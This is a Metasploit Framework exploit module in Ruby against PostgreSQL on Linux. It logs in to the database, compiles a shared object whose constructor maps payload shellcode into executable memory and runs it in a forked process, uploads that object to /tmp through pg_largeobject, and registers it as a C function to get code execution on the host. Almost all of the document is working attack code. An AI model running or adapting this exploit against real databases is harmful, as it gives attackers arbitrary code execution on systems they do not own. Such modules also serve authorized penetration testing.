# $Id$
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
require &#039;msf/core/exploit/postgres&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::Postgres
    include Msf::Auxiliary::Report
 
    # Creates an instance of this module.
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;PostgreSQL for Linux Payload Execution&#039;,
            &#039;Description&#039;    => %q{
                On some default Linux installations of PostgreSQL, the
                postgres service account may write to the /tmp directory, and
                may source UDF Shared Libraries&#039;s from there as well, allowing
                execution of arbitrary code.
 
                This module compiles a Linux shared object file, uploads it to
                the target host via the UPDATE pg_largeobject method of binary
                injection, and creates a UDF (user defined function) from that
                shared object. Because the payload is run as the shared object&#039;s
                constructor, it does not need to conform to specific Postgres
                API versions.
            },
            &#039;Author&#039;         =>
            [
                &#039;midnitesnake&#039;, # this Metasploit module
                &#039;egypt&#039;,        # on-the-fly compiled .so technique
                &#039;todb&#039;          # original windows module this is based on
            ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision$&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt&#039; ]
                ],
            &#039;Platform&#039;       => &#039;linux&#039;,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 65535,
                    &#039;DisableNops&#039;  => true,
                },
            &#039;Targets&#039;        =>
                [
                    [ &#039;Linux x86&#039;,       { &#039;Arch&#039; => ARCH_X86 } ],
                    [ &#039;Linux x86_64&#039;,    { &#039;Arch&#039; => ARCH_X86_64 } ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jun 05 2007&#039;
 
            ))
 
        deregister_options(&#039;SQL&#039;, &#039;RETURN_ROWSET&#039;)
    end
 
    # Buncha stuff to make typing easier.
    def username; datastore[&#039;USERNAME&#039;]; end
    def password; datastore[&#039;PASSWORD&#039;]; end
    def database; datastore[&#039;DATABASE&#039;]; end
    def rhost; datastore[&#039;rhost&#039;]; end
    def rport; datastore[&#039;rport&#039;]; end
    def verbose; datastore[&#039;VERBOSE&#039;]; end
    def bits; datastore[&#039;BITS&#039;];end
 
    def execute_command(cmd, opts)
        postgres_sys_exec(cmd)
    end
 
    def exploit
        version = do_login(username,password,database)
        case version
        when :noauth; print_error "Authentication failed."; return
        when :noconn; print_error "Connection failed."; return
        else
            print_status("#{rhost}:#{rport} - #{version}")
        end
 
        fname = "/tmp/#{Rex::Text.rand_text_alpha(8)}.so"
        tbl,fld,so,oid = postgres_upload_binary_data(payload_so(fname), fname)
 
        unless tbl && fld && so && oid
            print_error "Could not upload the UDF SO"
            return
        end
 
        print_status "Uploaded #{so} as OID #{oid} to table #{tbl}(#{fld})"
        begin
            func_name = Rex::Text.rand_text_alpha(10)
            postgres_query(
                "create or replace function pg_temp.#{func_name}()"+
                " returns void as &#039;#{so}&#039;,&#039;#{func_name}&#039;"+
                " language &#039;C&#039; strict immutable"
            )
        rescue
        end
        postgres_logout if @postgres_conn
 
    end
 
 
    # Authenticate to the postgres server.
    #
    # Returns the version from #postgres_fingerprint
    def do_login(user=nil,pass=nil,database=nil)
        begin
            password = pass || postgres_password
            vprint_status("Trying #{user}:#{password}@#{rhost}:#{rport}/#{database}")
            result = postgres_fingerprint(
                :db => database,
                :username => user,
                :password => password
            )
            if result[:auth]
                report_service(
                    :host => rhost,
                    :port => rport,
                    :name => "postgres",
                    :info => result.values.first
                )
                return result[:auth]
            else
                return :noauth
            end
            return :noconn
        end
    end
 
 
    def payload_so(filename)
        shellcode = Rex::Text.to_hex(payload.encoded, "\\x")
        #shellcode = "\\xcc"
 
        c = %Q^
            int _exit(int);
            int printf(const char*, ...);
            int perror(const char*);
            void *mmap(int, int, int, int, int, int);
            void *memcpy(void *, const void *, int);
            int mprotect(void *, int, int);
            int fork();
            int unlink(const char *pathname);
 
            #define MAP_PRIVATE 2
            #define MAP_ANONYMOUS 32
            #define PROT_READ 1
            #define PROT_WRITE 2
            #define PROT_EXEC 4
 
            #define PAGESIZE 0x1000
 
            char shellcode[] = "#{shellcode}";
 
            void run_payload(void) __attribute__((constructor));
 
            void run_payload(void)
            {
                int (*fp)();
                fp = mmap(0, PAGESIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
 
                memcpy(fp, shellcode, sizeof(shellcode));
                if (mprotect(fp, PAGESIZE, PROT_READ|PROT_WRITE|PROT_EXEC)) {
                    _exit(1);
                }
                if (!fork()) {
                    fp();
                }
 
                unlink("#{filename}");
                return;
            }
 
        ^
 
        cpu = case target_arch.first
            when ARCH_X86; Metasm::Ia32.new
            when ARCH_X86_64; Metasm::X86_64.new
            end
        payload_so = Metasm::ELF.compile_c(cpu, c, "payload.c")
 
        so_file = payload_so.encode_string(:lib)
 
        so_file
    end
end

